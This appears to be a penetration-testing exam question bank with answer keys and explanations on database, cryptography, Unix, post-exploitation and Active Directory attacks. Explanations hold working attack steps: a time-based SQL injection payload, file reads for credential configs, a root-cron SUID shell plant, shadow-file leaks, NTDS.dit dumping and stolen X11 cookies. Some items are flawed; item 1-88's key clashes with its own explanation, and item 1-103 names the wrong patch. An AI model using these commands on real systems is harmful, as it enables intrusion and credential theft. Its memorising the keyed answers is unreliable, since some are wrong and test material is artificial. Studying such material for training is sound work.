    {id:"1-54",domain:"Database",q:"MSSQL service runs as 'NETWORK SERVICE' instead of domain admin. What is the impact on XP_CMDSHELL command execution?",opts:["Commands execute with SYSTEM privileges regardless of service account","Commands execute with NETWORK SERVICE privileges, which may have limited local OS rights","XP_CMDSHELL is automatically disabled when running as NETWORK SERVICE","Commands execute as the SA database user which has OS-level admin privileges"],ans:1,exp:"XP_CMDSHELL runs OS commands as the SQL Server service account — not SA (SA is database-level only). NETWORK SERVICE has limited OS privileges: it can access network resources but has minimal local rights. You likely cannot add users, write to system directories, or escalate further without finding a secondary privilege escalation vector."},
    {id:"1-55",domain:"Database",q:"Web app backed by MSSQL. Payload ''; WAITFOR DELAY '0:0:5'--' causes a 5-second delay. What is confirmed?",opts:["Error-based SQL injection; the database is returning parseable errors","Time-based blind SQL injection; the database executes injected SQL despite no visible output","Stacked query execution allowing multiple statement injection","Boolean-based blind injection confirmed by the delayed response"],ans:1,exp:"WAITFOR DELAY is MSSQL-specific time-based blind injection. The semicolon introduces a stacked query. The 5-second delay confirms: (1) SQL injection exists, (2) stacked queries execute on MSSQL, (3) the backend is MSSQL. Next steps: use time-based exfiltration or sqlmap --technique=T for full enumeration."},
    {id:"1-56",domain:"Database",q:"What is the primary purpose of running 'EXEC sp_helpserver' on a compromised MSSQL instance?",opts:["List all databases and their owners","Enumerate linked servers and remote server configurations that could be leveraged for lateral movement","Display all SQL Server Agent jobs scheduled","Show the SQL Server service account and connection details"],ans:1,exp:"sp_helpserver returns all linked servers configured on the instance. Linked servers can be configured with higher-privileged credentials than the current connection, enabling privilege escalation and lateral movement to other database servers. Use EXECUTE AT or OPENQUERY to run queries on linked servers."},
    {id:"1-57",domain:"Database",q:"Connected to MSSQL as SA. How do you read a Windows filesystem file via SQL?",opts:["SELECT * FROM OPENROWSET(BULK 'C:\\Windows\\System32\\drivers\\etc\\hosts', SINGLE_CLOB) AS t","EXEC XP_FILEREAD 'C:\\Windows\\System32\\drivers\\etc\\hosts'","USE master; SELECT file_read('C:\\hosts')","EXEC sp_readfile 'C:\\Windows\\System32\\drivers\\etc\\hosts'"],ans:0,exp:"OPENROWSET with BULK provider and SINGLE_CLOB option reads a file from the filesystem as a large character object. Requires ADMINISTER BULK OPERATIONS or sysadmin privilege. XP_FILEREAD and sp_readfile don't exist as standard MSSQL procedures. Useful for reading web.config, appsettings.json, and other config files containing credentials."},
    {id:"1-58",domain:"Database",q:"Oracle database found on port 1521. Which tool/approach enumerates valid Oracle SIDs remotely?",opts:["nmap --script oracle-sid-brute to test common SIDs against the TNS listener","Connect via JDBC and query v$instance to retrieve the SID","Use oracscan to brute force valid usernames against the default SID","Query LDAP for Oracle service registrations"],ans:0,exp:"The Oracle TNS Listener responds to SID brute force. nmap's oracle-sid-brute NSE script tests common SIDs (ORCL, XE, PROD, etc.). Alternative: use metasploit's auxiliary/scanner/oracle/sid_brute. Without a valid SID you cannot authenticate. Once you have the SID, try default accounts: SYSTEM/manager, SYS/change_on_install, SCOTT/TIGER."},
    {id:"1-59",domain:"Database",q:"Oracle SYSTEM password is set to 'manager' (factory default). What should you attempt IMMEDIATELY upon login?",opts:["Change the SYSTEM password to document the vulnerability","Enumerate all database users and their privileges, then escalate to DBA role if not already assigned","Execute SELECT * FROM dba_users to confirm the SYSTEM privilege level","Run the Oracle exploit suggester to identify privilege escalation paths"],ans:1,exp:"Immediate post-login steps: enumerate users (SELECT * FROM dba_users), check your current privileges (SELECT * FROM session_privs), enumerate schemas with interesting data. SYSTEM has DBA equivalent rights but confirming and enumerating sets the scope. Changing the password is not a tester's role — document and report."},
    {id:"1-60",domain:"Cryptography",q:"DES is used to encrypt session tokens (56-bit key). What is the PRIMARY weakness?",opts:["DES uses a 56-bit key making exhaustive key search feasible with modern hardware","DES is symmetric, meaning the same key is used for encryption and decryption","DES generates the same ciphertext for identical plaintext blocks","DES does not support key exchange protocols"],ans:0,exp:"DES's 56-bit effective key space (2^56) can be exhaustively searched with modern hardware or distributed computing. In 1997, RSA's DES Challenges showed this could be done in hours. Being symmetric (option B) is normal for block ciphers. ECB mode producing same output for same input (option C) is a MODE problem not DES-specific."},
    {id:"1-61",domain:"Cryptography",q:"Application stores passwords using MD5(password) without salt. What specifically makes this easier to crack than bcrypt?",opts:["MD5 is symmetric whereas bcrypt is asymmetric","MD5 is computationally inexpensive and unsalted, making rainbow tables and GPU cracking viable","MD5 truncates passwords to 8 characters before hashing","MD5 uses ECB mode producing identical outputs for identical inputs"],ans:1,exp:"MD5 is designed for speed (checksumming), producing ~8 billion hashes/second on a modern GPU. bcrypt is intentionally slow with a configurable work factor producing ~100 hashes/second. Without salt, identical passwords produce identical hashes enabling rainbow tables. bcrypt includes per-password salt by design."},
    {id:"1-62",domain:"Cryptography",q:"SSH-1 detected on a legacy Unix server. What specific design flaw makes SSH-1 inherently vulnerable?",opts:["SSH-1 uses RC4 encryption which has known statistical biases","SSH-1 lacks integrity protection on portions of the handshake, making it vulnerable to MITM attacks","SSH-1 stores the host private key in /etc/ssh in world-readable format","SSH-1 uses 512-bit RSA keys which can be factored"],ans:1,exp:"SSH-1's critical flaw: CRC-32 (not a MAC) is used for integrity — trivially forgeable. The 'insertion attack' (CRC32 compensation attack) allows MITM modification of packets. The source notes: 'SSH-1 has inherent design flaws which make it vulnerable (e.g., man-in-the-middle attacks), it is now generally considered obsolete.'"},
    {id:"1-63",domain:"Cryptography",q:"A web app uses TLS 1.0 with CBC mode cipher suites. Which specific attack is MOST applicable?",opts:["BEAST attack exploiting predictable IV generation in TLS 1.0 CBC mode","POODLE attack targeting SSL 3.0 padding oracle","CRIME attack exploiting TLS compression side-channel","Heartbleed exploiting OpenSSL heartbeat extension buffer over-read"],ans:0,exp:"BEAST (Browser Exploit Against SSL/TLS) specifically targets TLS 1.0 CBC mode's predictable IV vulnerability. In TLS 1.0, the IV for the next record is the last ciphertext block of the previous record — predictable and exploitable with chosen-plaintext. POODLE targets SSLv3. CRIME targets TLS compression. Heartbleed targets OpenSSL memory."},
    {id:"1-64",domain:"Cryptography",q:"A digital certificate uses 512-bit RSA. Why is this insecure?",opts:["512-bit RSA uses MD5 for signing which is collision-vulnerable","512-bit RSA keys can be factored in a reasonable timeframe, allowing private key recovery","512-bit keys are too short for AES-256 key exchange","RSA 512-bit doesn't support forward secrecy"],ans:1,exp:"512-bit RSA was factored in 1999 using the General Number Field Sieve (GNFS) algorithm. With modern hardware and cloud computing, 512-bit RSA can be factored in hours/days. Private key recovery means the attacker can decrypt past traffic and forge signatures. NIST recommends minimum 2048-bit RSA."},
    {id:"1-65",domain:"Cryptography",q:"A user has 'Do not require Kerberos preauthentication' enabled. An AS-REP response is captured. What offline attack is possible?",opts:["Pass-the-ticket using the captured TGT directly","AS-REP roasting: cracking the encrypted portion of the AS-REP offline to recover the user's password","Silver ticket attack using the service hash from the AS-REP","Kerberos delegation abuse using the unconstrained delegation flag"],ans:1,exp:"Without preauthentication, any attacker can request an AS-REP for the user. The AS-REP contains a session key encrypted with the user's password hash — this encrypted blob can be cracked offline (hashcat mode 18200). Unlike Kerberoasting which needs an authenticated session, AS-REP roasting can be done unauthenticated."},
    {id:"1-66",domain:"Cryptography",q:"A JWT token header specifies 'alg: none'. What vulnerability does this indicate?",opts:["The token is transmitted in plaintext and readable in transit","The server accepts tokens without signature validation if alg:none is specified, allowing arbitrary claim forgery","The token uses symmetric signing allowing the server to forge its own tokens","JWT with alg:none is standard for development environments and not exploitable in production"],ans:1,exp:"Some JWT libraries accept 'alg: none' as valid, meaning they skip signature verification entirely. An attacker can decode the header and payload, modify any claims (e.g., role:admin), re-encode with alg:none and empty signature — and the server accepts it. Libraries should explicitly reject alg:none for non-local tokens."},
    {id:"1-67",domain:"Cryptography",q:"An application uses AES-ECB to encrypt session blocks. What specific weakness does ECB have versus CBC?",opts:["ECB uses a shorter key length than CBC","Identical plaintext blocks produce identical ciphertext blocks in ECB, revealing patterns in the data","ECB doesn't use an IV, making it vulnerable to replay attacks","ECB is slower than CBC, susceptible to timing attacks"],ans:1,exp:"ECB (Electronic Codebook) encrypts each block independently with the same key. Identical plaintext blocks produce identical ciphertext blocks — leaking structural information. The classic demonstration: encrypting a bitmap in ECB mode leaves the image structure visible. CBC (Cipher Block Chaining) XORs each block with the previous ciphertext, preventing this pattern leakage."},
    {id:"1-68",domain:"Cryptography",q:"A developer claims their custom XOR cipher is secure because the key is 256 bits. Why is it insecure regardless of key length?",opts:["XOR cannot operate on binary data larger than 8 bits per operation","XOR ciphers are linear; with known plaintext/ciphertext pairs the key is trivially recoverable","XOR encryption is not reversible without the original plaintext","256-bit XOR keys have reduced effective keyspace due to birthday paradox"],ans:1,exp:"A repeating XOR stream cipher is linear — if you know any plaintext-ciphertext pair, XOR them to get the key segment (P XOR C = K). If the key repeats, aligning two ciphertexts and XORing eliminates the key (C1 XOR C2 = P1 XOR P2) enabling statistical attacks. One-time pad (XOR with truly random never-reused key) IS secure but custom XOR implementations never meet this standard."},
    {id:"1-69",domain:"Cryptography",q:"sslscan finds SSLv3 enabled on a target. Which padding oracle attack specifically targets SSLv3?",opts:["BEAST","POODLE","CRIME","DROWN"],ans:1,exp:"POODLE (Padding Oracle On Downgraded Legacy Encryption) specifically exploits SSLv3's CBC padding implementation. SSLv3 uses non-deterministic padding that allows a padding oracle to decrypt one byte per ~256 requests. BEAST targets TLS 1.0 CBC. CRIME targets TLS/SPDY compression. DROWN targets SSLv2 key material reuse with RSA."},
    {id:"1-70",domain:"Post-Exploitation",q:"After MS08-067 exploitation, 'getsystem' attempts KiTrap0D (technique 4). What does KiTrap0D exploit?",opts:["A kernel vulnerability in the NTDVM subsystem affecting Windows NT 3.1 through Windows 7","A buffer overflow in the Windows print spooler affecting XP and Vista only","A UAC bypass in the Windows Task Scheduler affecting Vista through Windows 10","A DLL injection in winlogon.exe affecting Windows 2000 and XP only"],ans:0,exp:"KiTrap0D exploits a flaw in the Windows NT kernel's VDM (Virtual DOS Machine) task-switching, affecting Windows NT 3.1 through Windows 7 (2009). The vdmallowed.exe tool demonstrates it. The source shows it elevating from 'XP-SP2\\testuser' to 'NT AUTHORITY\\SYSTEM' by exploiting the #GP fault handler in the NTDVM subsystem."},
    {id:"1-71",domain:"Post-Exploitation",q:"Post-exploitation: which registry location stores the count of cached domain credential sets?",opts:["HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon: CachedLogonsCount","HKLM\\SECURITY\\Cache: NL$Control","HKLM\\SAM\\SAM\\Domains\\Account\\Users: CachedCreds","HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Authentication: CachedLogons"],ans:0,exp:"CachedLogonsCount is stored at HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon. It controls how many domain credential sets are cached locally (default: 10). The actual cached hashes are in HKLM\\SECURITY\\Cache (NL$1 through NL$10) but are encrypted. The count setting tells you how many cached credentials might be recoverable."},
    {id:"1-72",domain:"Post-Exploitation",q:"Meterpreter session is 'XP-SP2\\testuser'. 'use priv' then 'getsystem' succeeds. What does 'use priv' load?",opts:["A privilege audit module enumerating all exploitable privileges","The priv extension loading additional privilege escalation and token manipulation commands into Meterpreter","A Python script performing automated post-exploitation recon","The incognito module for token impersonation attacks"],ans:1,exp:"Meterpreter extensions add capabilities. 'use priv' loads the priv extension providing: getsystem (privilege escalation), hashdump (password hash extraction), and token manipulation. Without loading priv, getsystem is unavailable. The source shows: use priv → getsystem → getuid confirming NT AUTHORITY\\SYSTEM."},
    {id:"1-73",domain:"Post-Exploitation",q:"After gaining SYSTEM on a Windows machine, PWDumpX is run with -cp flags. What does this combination do?",opts:["Connects and dumps only cached password hashes","Connects and dumps both SAM hashes AND cached credentials from the registry","Cracks passwords using a pre-configured wordlist and outputs plaintext","Copies the SAM database to a remote share for offline analysis"],ans:1,exp:"PWDumpX flags: -c = dump cached credentials (domain credentials cached locally in MSCACHE), -p = dump password hashes from SAM. Combined (-cp) gets both: LM/NT hashes for local accounts, and cached MSCACHE/DCC2 hashes for previously logged-in domain users. The source shows PWDumpX retrieving both PWHashes.txt and PWCache.txt."},
    {id:"1-74",domain:"Post-Exploitation",q:"Fully patched Windows 7, standard user, no known kernel exploits. MOST likely privilege escalation approach?",opts:["Exploit MS08-067 with a low-privilege payload","Enumerate service executables writable by the current user using accesschk.exe, then replace with a malicious binary","Inject shellcode into a running SYSTEM process via process migration","Use mimikatz to extract plaintext credentials from LSASS memory"],ans:1,exp:"Without kernel exploits, look for misconfigurations: writable service executables (SVC_CACLS/accesschk), weak service permissions, AlwaysInstallElevated registry setting, DLL hijacking in service directories, unquoted service paths. Writable service executable is the technique documented in the source material (SVC_CACLS.exe on the Cisco VPN service)."},
    {id:"1-75",domain:"Methodology",q:"After a penetration test, what are the MANDATORY minimum cleanup actions?",opts:["Reinstall the operating system to ensure no trace remains","Remove all user accounts created during testing and delete all files placed on or created during the test","Wipe event logs and clear all registry modifications","Submit a report noting changes but leave the system modified for client review"],ans:1,exp:"The source explicitly states minimum requirements: (1) remove user accounts created during compromise, (2) remove all files placed on or created on the system. Additional good practice: log timestamps of all changes to enable forensic triage if test activities are confused with real attacks. Wiping event logs is NOT recommended — it may be needed for audit trail."},
    {id:"1-76",domain:"Post-Exploitation",q:"You have SYSTEM on a DC and want domain hashes. Which technique uses VSS to bypass NTDS.dit file locking?",opts:["Run PWDumpX remotely against the DC","Create a shadow copy, copy NTDS.dit and SYSTEM hive from it, then use secretsdump.py offline","Use mimikatz lsadump::dcsync to pull hashes via replication","Run reg save HKLM\\SAM and HKLM\\SYSTEM then crack offline"],ans:1,exp:"NTDS.dit is locked by Active Directory while running. VSS creates a snapshot: vssadmin create shadow /for=C:\\, then copy from the shadow: \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\NTDS.dit and SYSTEM hive, then use secretsdump.py --system SYSTEM.hive --ntds NTDS.dit LOCAL. DCSync (option C) doesn't use VSS but requires replication rights."},
    {id:"1-77",domain:"ActiveDirectory",q:"DCSync attack: which specific AD right must the attacking account possess to perform it without being Domain Admin?",opts:["SeDebugPrivilege and SeImpersonatePrivilege on the DC","Replicating Directory Changes AND Replicating Directory Changes All permissions on the domain object","WriteDACL permission on the domain controller computer object","GenericAll permission on the Domain Admins group object"],ans:1,exp:"DCSync uses MS-DRSR to pull password hashes as if performing DC replication. Required permissions on the domain NC root: 'Replicating Directory Changes' AND 'Replicating Directory Changes All'. With both rights, any account can DCSync. Domain Admins and Enterprise Admins have these by default. This is how you give a non-admin account DCSync capability stealthily."},
    {id:"1-78",domain:"Post-Exploitation",q:"Incognito lists delegation and impersonation tokens. What is the key difference between these token types?",opts:["Delegation tokens can authenticate to network resources; impersonation tokens are restricted to local access","Impersonation tokens can authenticate to network resources; delegation tokens are restricted to local machine","Both token types provide identical capabilities","Delegation tokens expire after 8 hours; impersonation tokens are persistent"],ans:0,exp:"Windows token types — Delegation (level 3/4): can be used for network authentication, the token can be presented to remote services. Impersonation (level 2): can impersonate locally but cannot be used for network authentication. Impersonation tokens are sufficient for local privilege escalation but you need delegation-level tokens for pass-the-token attacks to remote resources."},
    {id:"1-79",domain:"Unix",q:"Post-exploitation finds: '*/5 * * * * root /opt/backup/backup.sh' and /opt/backup/backup.sh is world-writable. What is the exploitation path?",opts:["Modify backup.sh to include a reverse shell; wait up to 5 minutes for root to execute it","Copy backup.sh to /tmp, modify it, and replace the original","Use ptrace to inject code into the running backup.sh process","Replace the cron daemon with a malicious version"],ans:0,exp:"World-writable cron script owned by root = instant root access. Simply: echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> /opt/backup/backup.sh, then wait up to 5 minutes. Or add a reverse shell one-liner. The script runs as root due to the 'root' keyword in the cron job definition. Equivalent to direct crontab write access."},
    {id:"1-80",domain:"Methodology",q:"Penetration test scope is 192.168.1.0/24. During testing you discover a pivot to 10.10.0.0/16. What should you do IMMEDIATELY?",opts:["Continue testing since it was reachable from in-scope network","Stop testing 10.10.0.0/16 immediately and contact the client to clarify whether it is in scope","Document the pivot route but continue testing on original scope only","Scan only the first /24 of the discovered network to minimise risk"],ans:1,exp:"Strict scope adherence is fundamental to legal and professional penetration testing. Testing out-of-scope networks without authorisation is illegal under the Computer Misuse Act 1990 regardless of how you got there. Correct action: stop, document, contact the client via the agreed communication channel, get explicit written authorisation before proceeding."},
    {id:"1-81",domain:"Methodology",q:"WSUS is identified on the internal network. What does a WSUS spoofing attack enable?",opts:["Denial of service by blocking all Windows Update traffic","Delivery of a malicious 'update' package to domain-joined machines, achieving RCE under SYSTEM","Enumeration of all installed patches across the domain","Extraction of Windows Update credentials from the WSUS server"],ans:1,exp:"WSUS over HTTP (not HTTPS) allows a MITM attacker to intercept WSUS traffic and inject malicious update packages. Windows Update packages are executed with SYSTEM privileges. The WSUSpect tool automates this attack. WSUS should always be configured over HTTPS with certificate validation."},
    {id:"1-82",domain:"Methodology",q:"CREST assessment, testing window is 09:00-17:00 weekdays, it is 16:45 Friday. You find a critical RCE. Correct action?",opts:["Exploit the vulnerability to demonstrate impact before time expires","Document the vulnerability without exploiting it and immediately notify the client contact","Continue testing past 17:00 since the window was nearly complete","Attempt a PoC exploit that demonstrates the flaw without causing harm"],ans:1,exp:"Rules of Engagement must be strictly followed. If the window closes at 17:00, testing must stop at 17:00. A critical finding should be documented and the client notified immediately through the agreed emergency contact procedure. Exploiting out-of-hours violates the RoE and potentially the Computer Misuse Act."},
    {id:"1-83",domain:"Methodology",q:"Social engineering phishing test is in scope. One employee enters domain credentials. What document makes this activity legal in the UK?",opts:["The engagement contract with the CISO's signature","A properly drafted Rules of Engagement document signed by an authorised representative of the target organisation","Verbal authorisation from the IT manager is sufficient","The Computer Misuse Act 1990 permits authorised phishing tests under Section 3A"],ans:1,exp:"Under the Computer Misuse Act 1990 and other UK laws, social engineering requires explicit written authorisation from someone with legal authority to grant it (not just the IT manager). The RoE must explicitly cover the scope and methods of social engineering activities. Verbal authorisation is insufficient."},
    {id:"1-84",domain:"Methodology",q:"HfNetchk is described as 'clientless'. What does this specifically mean?",opts:["The tool does not require a web browser to operate","No agent software needs to be installed on target machines; it uses domain credentials to remotely assess patch status","The tool only assesses patch status from the network perimeter","HfNetchk runs entirely from a USB drive without installation"],ans:1,exp:"Agentless patch management tools like HfNetchk assess systems remotely using administrative credentials and WMI/RPC without requiring any software pre-installed on each target. The source states: 'This product is clientless and relies on domain credentials to install patches.' Contrasts with agent-based solutions (PatchLink, BigFix)."},
    {id:"1-85",domain:"Web",q:"An application processes XML input and the server response includes content from a file referenced in the XML. What vulnerability is present?",opts:["SQL injection via XML parameters","XML External Entity (XXE) injection allowing file disclosure from the server filesystem","SSRF via the XML parser allowing internal network probing","XML injection enabling stored XSS through malformed XML parsing"],ans:1,exp:"XXE (XML eXternal Entity) injection: when an XML parser processes user-supplied XML with DTD external entity references (<!ENTITY xxe SYSTEM 'file:///etc/passwd'>), it resolves the reference and includes file content in the response. Next escalation: use http:// URIs instead of file:// to probe internal services (SSRF chaining)."},
    {id:"1-86",domain:"Web",q:"URL '/invoice/1042' changed to '/invoice/1041' accesses another user's invoice. What vulnerability is this?",opts:["SQL injection exploiting the integer parameter","Insecure Direct Object Reference (IDOR) / Broken Access Control","Session fixation via predictable session identifiers","Directory traversal via numeric path manipulation"],ans:1,exp:"IDOR (Insecure Direct Object Reference) occurs when an application exposes internal implementation objects (database IDs) directly in URLs/parameters without proper authorisation checks. Fix: implement server-side authorisation checks — verify the requesting user has permission to access the specific resource ID before returning it."},
    {id:"1-87",domain:"Methodology",q:"Specific operational advantage of agent-based patch management solutions over agentless?",opts:["Agent-based solutions can patch non-domain-joined systems","Agent-based solutions reduce network traffic by offloading processing and analysis to the target system","Agent-based solutions don't require administrative credentials","Agent-based solutions can patch systems during off-hours without VPN"],ans:1,exp:"Agent-based (PatchLink, BigFix): processing runs locally, only results reported to the central server, minimal network traffic. Agentless (Shavlik, HfNetchk): all scanning/assessment traffic crosses the network per scan — significant traffic for large domains. The source notes: 'Agent-based products can greatly reduce network traffic by offloading processing and analysis to the target system.'"},
    {id:"1-88",domain:"Methodology",q:"CVSS v3 for a default MSSQL SA account with no password on an internet-facing server. Which base metric would be 'None'?",opts:["Attack Vector","Privileges Required","Authentication","User Interaction"],ans:3,exp:"For default SA with blank password, internet-facing: Attack Vector=Network, Complexity=Low, Privileges Required=None (no auth needed), User Interaction=None (automated exploitation possible), Scope=Changed, C/I/A=High → CVSS ~10.0 Critical. The correct answer is User Interaction=None since no human action is required to exploit the finding."},
    {id:"1-89",domain:"Methodology",q:"Why must timestamps be logged for each change made during a penetration test?",opts:["Timestamps are required by the Computer Misuse Act to prove authorisation","To enable the client to verify changes are within the authorised testing window and assist forensic analysis if test activities are confused with real attacks","CREST certification requires timestamped logs for post-exam submission","Timestamps help calculate billable hours for the engagement"],ans:1,exp:"Timestamped change logs serve two critical purposes: (1) demonstrate all activities occurred within the authorised engagement window (important if the client's SOC raises an incident), (2) help the incident response team distinguish test artefacts from real attacker actions during post-engagement forensic triage. This is professional due diligence."},
    {id:"1-90",domain:"Unix",q:"rpcinfo shows ttdbserverd (rpc #100083) running. What type of vulnerability is historically associated with it?",opts:["Information disclosure via the tooltip database","Remote buffer overflow vulnerabilities in the ToolTalk database server allowing unauthenticated code execution","SQL injection in the database query interface","Weak authentication allowing unauthenticated access"],ans:1,exp:"ToolTalk Database Server (TTDBSERVERD) has had multiple critical remote buffer overflow vulnerabilities (CVE-2002-0045, CERT Advisory CA-2002-26) allowing unauthenticated attackers to execute arbitrary code as root. The source shows it listed in an nmap RPC scan, implying it should be investigated for known CVEs on the relevant Solaris version."},
    {id:"1-91",domain:"Unix",q:"raptor_passwd.c is compiled and run on Solaris. Which specific vulnerability class does it exploit?",opts:["Stack-based buffer overflow in the GECOS field processing","A circ() function vulnerability in passwd — a race condition in circular buffer handling","Format string vulnerability in the password prompt handling","Integer overflow in the crypt() function"],ans:1,exp:"raptor_passwd.c (by Marco Ivaldi) exploits a vulnerability in the passwd binary's circ() function on Solaris 8/9 SPARC. The source shows it being compiled and run with a temp password argument, successfully obtaining uid=0(root). The specific flaw is in the circular buffer handling within the password validation code."},
    {id:"1-92",domain:"Unix",q:"pca.pl is run with '-f . -l missings'. What three files must be present in the current directory?",opts:["passwd, shadow, and hosts","uname -a output, pkginfo -x output, and showrev -p output","syslog, kern.log, and patchlist","/etc/release, /etc/motd, and pkg_info output"],ans:1,exp:"Patch Check Advanced (pca.pl) for Solaris requires: (1) uname -a (OS version/hostname/platform), (2) pkginfo -x (installed packages), (3) showrev -p (installed patches). These three files in the current directory (indicated by -f .) allow pca.pl to cross-reference against patchdiag.xref and list missing security patches with severity ratings."},
    {id:"1-93",domain:"Unix",q:"A Linux 2.6 kernel privilege escalation exploit is in a .tgz archive containing exploit.c and run.sh. Correct execution sequence?",opts:["gcc exploit.c -o exploit && ./exploit","gunzip -c proto_ops.tgz | tar xvf - && chmod +x run.sh && ./run.sh","tar -xf exploit.tgz && make && make install","python exploit.c && ./a.out"],ans:1,exp:"The source shows exactly this sequence: gunzip -c proto_ops.tgz | tar xvf - (extract the archive), chmod +x run.sh (make executable), ./run.sh (run it). run.sh handles compilation (calling gcc) and execution. This is the Linux 2.6 kernel exploit transfer and execution workflow shown in the documentation with the TFTP-based exfiltration scenario."},
    {id:"1-94",domain:"Unix",q:"AIX stores password hashes in /etc/security/passwd. What is the significance of this difference?",opts:["AIX does not support password hashing; credentials are plaintext","AIX stores password hashes in /etc/security/passwd instead of /etc/shadow; tools must target this path","AIX /etc/security/passwd stores Kerberos keytab entries","AIX uses a hash format that cannot be cracked by standard tools"],ans:1,exp:"Different Unix variants store password data differently: Linux=/etc/shadow, AIX=/etc/security/passwd, HP-UX=/etc/shadow (trusted mode) or /tcb/files/auth. John the Ripper and hashcat support AIX formats. When on an AIX system, run: cat /etc/security/passwd instead of /etc/shadow. The unshadow step may also differ."},
    {id:"1-95",domain:"Unix",q:"XDMCP on UDP 177, no other remote services. Using 'Xephyr -query 10.10.10.10 -screen 800x600 :1'. What does this provide?",opts:["A reverse X11 tunnel back to the attacker's display","A remote graphical login session to the target host via XDMCP displaying the host's login screen","An X11 forwarding session allowing running remote applications on the attacker's display","A screenshot grab of the current console session"],ans:1,exp:"Xephyr is a nested X server. With -query, it sends an XDMCP query to the target, which responds with a graphical login screen displayed in the Xephyr window on the attacker's machine. The source documents this for Unix 1: 'need to connect and get a trophy file from a banner with a user list' — the XDMCP login screen reveals usernames."},
    {id:"1-96",domain:"Unix",q:"'httpd -f /etc/shadow -t' is run after finding Apache under sudo. What does this achieve?",opts:["Tests HTTP connectivity to /etc/shadow for web exposure","Forces Apache to parse /etc/shadow as a configuration file, causing syntax errors that output portions of the file's contents including password hashes","Enables directory traversal through the httpd configuration parser","Creates a temporary web server serving /etc/shadow over HTTP"],ans:1,exp:"Apache's -t flag tests configuration file syntax. When /etc/shadow is passed as the config file via -f, Apache's config parser attempts to interpret each line as a config directive. When it fails, it outputs error messages containing portions of the line being parsed — thus leaking shadow file content including hashes. Documented in the source as an alternate technique."},
    {id:"1-97",domain:"Unix",q:"You copy another user's .Xauthority file. What can this cookie be used for?",opts:["Decrypting SSH host keys from the same user's session","Authenticating to the user's X display without knowing their login password, enabling screen capture and input injection","Accessing NFS shares mounted by the user without re-authentication","Forging Kerberos service tickets using the cookie as a session key"],ans:1,exp:".Xauthority contains MIT-MAGIC-COOKIE-1 — random authentication tokens for X display access. With 'xauth merge /path/to/stolen/.Xauthority', add their cookies to your keychain. Then 'DISPLAY=:0 xterm' opens a terminal in their X session, or 'DISPLAY=:0 xwd -root | xwud' captures their screen. X11 user-based auth relies entirely on the secrecy of the .Xauthority file."},
    {id:"1-98",domain:"Unix",q:"'/usr/bin/nmap' has SUID bit set (older Nmap with interactive mode). What exploitation technique works?",opts:["Use nmap script mode to download and execute a root shell payload","Use nmap's --interactive mode to drop to an OS shell running as root via '!sh'","Exploit nmap's XML parsing engine with a specially crafted input file","Inject a malicious NSE script to execute arbitrary commands"],ans:1,exp:"Old Nmap versions had --interactive mode that dropped to a shell: 'nmap --interactive' then '!sh' at the nmap> prompt. Since nmap has SUID root, the shell spawns as root. This is a well-known GTFOBins technique. Modern nmap (5.0+) removed interactive mode. The SUID nmap vector is a CREST favourite for SUID binary exploitation scenarios."},
    {id:"1-99",domain:"Networking",q:"'ssh -D 9050 user@compromised'. What does the -D flag create?",opts:["A dynamic port forward creating a SOCKS proxy on port 9050 routing traffic through the SSH tunnel","A direct port forward from attacker port 9050 to the target network","A reverse tunnel from the compromised host to the attacker on port 9050","A dedicated X11 forwarding channel on port 9050"],ans:0,exp:"SSH -D creates a SOCKS proxy (dynamic port forwarding). All TCP connections made through SOCKS port 9050 are tunnelled through the SSH connection to the compromised host, which then makes final connections. Use with proxychains: proxychains nmap -sT target-internal. This enables scanning internal networks visible only from the compromised host."},
    {id:"1-100",domain:"ActiveDirectory",q:"FSMO roles: which is specifically responsible for password changes and account lockouts in a multi-domain forest?",opts:["Schema Master","RID Master","PDC Emulator","Infrastructure Master"],ans:2,exp:"PDC Emulator: handles password changes (propagates faster than normal replication), processes account lockouts, serves as authoritative time source for the domain, handles NT4-compatible authentication, and is preferred DC for GPO editing. RID Master allocates RID pools. Schema Master controls schema changes. Infrastructure Master resolves cross-domain group membership."},
    {id:"1-101",domain:"ActiveDirectory",q:"Querying the Global Catalog (GC) versus a standard DC: what specific advantage does the GC offer?",opts:["The GC stores plaintext credentials unlike standard DCs","The GC contains a partial replica of ALL objects in the forest, allowing cross-domain searches without referral chasing","The GC operates on port 3268/3269 bypassing most firewall rules","The GC supports anonymous LDAP binds even on Windows Server 2008+"],ans:1,exp:"The Global Catalog (TCP 3268/LDAPS 3269) contains a partial attribute set for ALL objects in the ENTIRE forest — not just the local domain. One query can find objects across all domains without referrals or multiple DC queries. The source states: 'The GC contains the names of all objects in the Active Directory server, regardless of how the server has been partitioned.'"},
    {id:"1-102",domain:"ActiveDirectory",q:"Kerberoasting targets SPNs. Why is this possible without elevated privileges?",opts:["TGS tickets are encrypted with the DC's KRBTGT key which is publicly derivable","Any authenticated domain user can request a TGS for any SPN; the ticket is encrypted with the service account's password hash enabling offline cracking","SPNs are in the Global Catalog without access control, allowing unauthenticated enumeration","Service accounts have passwords stored in cleartext in SYSVOL by design"],ans:1,exp:"Kerberos by design: any authenticated user can request a TGS for any registered SPN. The KDC encrypts the service ticket with the service account's NT hash. The requesting user gets back an encrypted blob crackable offline without interacting with the service. This design trade-off (for single sign-on) creates the Kerberoasting attack vector — hashcat mode 13100."},
    {id:"1-103",domain:"ActiveDirectory",q:"GPP XML files in SYSVOL have cpassword attributes. Why is this a critical finding?",opts:["GPP passwords are stored using a proprietary algorithm requiring the SYSTEM key","The AES-256 key used to encrypt cpassword was published by Microsoft in MSDN, making all cpassword values decryptable by anyone","GPP passwords are NTLM hashes that can be passed directly","SYSVOL is only readable by domain admins so this is low risk"],ans:1,exp:"Microsoft published the AES-256 key used to encrypt Group Policy Preferences passwords in MSDN documentation (KB2962486). Any domain user can read SYSVOL, find cpassword attributes, and decrypt them using gpp-decrypt or PowerSploit's Get-GPPPassword. MS13-006 addressed this for new GPP settings but legacy preferences may still exist."},
